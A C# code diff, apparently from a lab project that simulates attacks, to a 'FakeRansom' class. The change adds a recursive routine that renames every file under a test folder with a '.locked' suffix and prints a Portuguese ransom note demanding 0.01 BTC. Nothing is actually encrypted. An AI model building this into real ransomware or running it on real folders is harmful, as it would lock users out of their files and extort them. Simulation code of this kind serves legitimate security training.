@@ -6,9 +6,9 @@ using System.Threading.Tasks;
 
 namespace Laboratorio.Attacks.App.Attacks
 {
-    class FakeRansom
+    public class FakeRansom
     {
-        static void Main()
+        public static void ExecuteRansom()
         {
             string folder = @"C:\TesteRansom\";
 
@@ -17,7 +17,21 @@ namespace Laboratorio.Attacks.App.Attacks
                 File.Move(file, file + ".locked");
             }
 
+            EncryptFilesInFolder(folder);
             Console.WriteLine("Seus arquivos foram bloqueados! Pague 0.01 BTC para recuperar.");
         }
+
+
+        private static void EncryptFilesInFolder(string pathFolder)
+        {
+            foreach (string dir in Directory.GetDirectories(pathFolder))
+            {
+                foreach (string file in Directory.GetFiles(dir))
+                    File.Move(file, file + ".locked");
+
+                EncryptFilesInFolder(dir);
+            }
+        }
+
     }
 }
